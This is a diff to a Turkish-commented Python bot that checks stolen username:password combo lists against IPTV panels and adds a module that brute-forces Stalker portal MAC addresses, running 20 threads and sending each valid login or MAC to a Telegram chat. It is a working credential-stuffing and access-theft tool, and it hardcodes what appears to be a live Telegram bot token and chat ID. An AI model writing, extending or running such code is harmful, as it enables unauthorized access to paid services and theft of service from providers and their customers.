@@ -14,7 +14,7 @@ app = Flask('')
 
 @app.route('/')
 def home():
-    return "IPTV Bot Aktif ve Hızlı (Multi-Thread) Modda Çalışıyor!"
+    return "IPTV & MAC Bot Aktif ve Hızlı (Multi-Thread) Modda Çalışıyor!"
 
 TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
 CHAT_ID = "-1003901042500"
@@ -25,7 +25,6 @@ def telegrama_gonder(mesaj):
         data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
         res = requests.post(url, data=data, timeout=10)
         
-        # Telegram yanıtını kontrol edelim (Spam veya hata varsa konsola yazdırsın)
         if res.status_code != 200:
             print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}, Cevap: {res.text}")
         else:
@@ -105,7 +104,7 @@ def m3u_tara_detayli(panel, user, pas):
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                 
                 mesaj = (
-                    f"🟢 <b>IPTV HİT BULUNDU!</b>\n"
+                    f"🟢 <b>IPTV HİT BULUNDU! (Line)</b>\n"
                     f"🌐 <b>Ana Host:</b> http://{panel}\n"
                     f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
                     f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
@@ -123,13 +122,35 @@ def m3u_tara_detayli(panel, user, pas):
         pass
     return False
 
+# --- EKLENEN YENİ MAC TARAMA MODÜLÜ ---
+def mac_tara_detayli(panel, mac):
+    # Stalker Portal MAC doğrulama uç noktası (Stalker API standardı)
+    mac_url = f"http://{panel}/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
+    try:
+        res = session.get(mac_url, headers=HEADERd, timeout=(3, 5), verify=False)
+        if res.status_code == 200 and ('token' in res.text or 'js' in res.text or 'life' in res.text):
+            print(f"[+] MAC HİT YAKALANDI! Panel: {panel} | MAC: {mac}")
+            
+            mesaj = (
+                f"🟢 <b>STALKER MAC HİT BULUNDU!</b>\n"
+                f"🌐 <b>Panel:</b> http://{panel}\n"
+                f"💻 <b>MAC Adresi:</b> <code>{mac}</code>\n"
+                f"🔗 <b>Portal Giriş:</b> http://{panel}/c/"
+            )
+            telegrama_gonder(mesaj)
+            return True
+    except:
+        pass
+    return False
+
 def arka_plan_tarayici():
-    print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
+    print("[*] Bulut Otonom Hızlı ve MAC Destekli Tarayıcı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Canlı Log ve Hata İzleme Modu Devrede.")
+    telegrama_gonder("🚀 <b>Hızlı Multi-Thread & MAC Tarayıcı Aktif!</b>\n⚡ Canlı Log ve Hata İzleme Modu Devrede.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
+    mac_dir = os.path.join(BASE_DIR, 'mac_list')  # MAC adreslerinin okunacağı klasör
     
     while True:
         try:
@@ -147,6 +168,7 @@ def arka_plan_tarayici():
             if not paneller:
                 paneller = ["ornekpanel.com:8080"]
 
+            # 1. BÖLÜM: STANDART COMBO (USER:PASS) TARAMASI
             if os.path.exists(combo_dir):
                 for dosya_adi in os.listdir(combo_dir):
                     if dosya_adi.endswith('.txt'):
@@ -171,12 +193,46 @@ def arka_plan_tarayici():
                         
                         for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
                             chunk = combolar[i:i + chunk_size]
-                            print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
+                            print(f"[i] İşleniyor (Combo): Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
                             
                             with ThreadPoolExecutor(max_workers=20) as executor:
                                 futures = [
                                     executor.submit(m3u_tara_detayli, panel, user, pas)
                                     for user, pas in chunk
+                                    for panel in paneller
+                                ]
+                                for future in as_completed(futures):
+                                    pass
+                            
+                            time.sleep(0.5)
+
+            # 2. BÖLÜM: MAC ADRESİ TARAMASI (mac_list klasöründen otomatik okur)
+            if os.path.exists(mac_dir):
+                for dosya_adi in os.listdir(mac_dir):
+                    if dosya_adi.endswith('.txt'):
+                        dosya_yolu = os.path.join(mac_dir, dosya_adi)
+                        print(f"\n[i] Taranan MAC dosyası: {dosya_adi}")
+                        
+                        mac_listesi = []
+                        with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
+                            for line in f:
+                                mac_clean = line.strip()
+                                if mac_clean:
+                                    mac_listesi.append(mac_clean)
+
+                        print(f"[i] Toplam {len(mac_listesi)} MAC adresi, {len(paneller)} panel ile taranıyor...")
+                        
+                        chunk_size = 1000
+                        toplam_chunk = (len(mac_listesi) + chunk_size - 1) // chunk_size
+                        
+                        for idx, i in enumerate(range(0, len(mac_listesi), chunk_size), 1):
+                            chunk = mac_listesi[i:i + chunk_size]
+                            print(f"[i] İşleniyor (MAC): Chunk {idx}/{toplam_chunk} ({len(chunk)} MAC)...")
+                            
+                            with ThreadPoolExecutor(max_workers=20) as executor:
+                                futures = [
+                                    executor.submit(mac_tara_detayli, panel, mac)
+                                    for mac in chunk
                                     for panel in paneller
                                 ]
                                 for future in as_completed(futures):
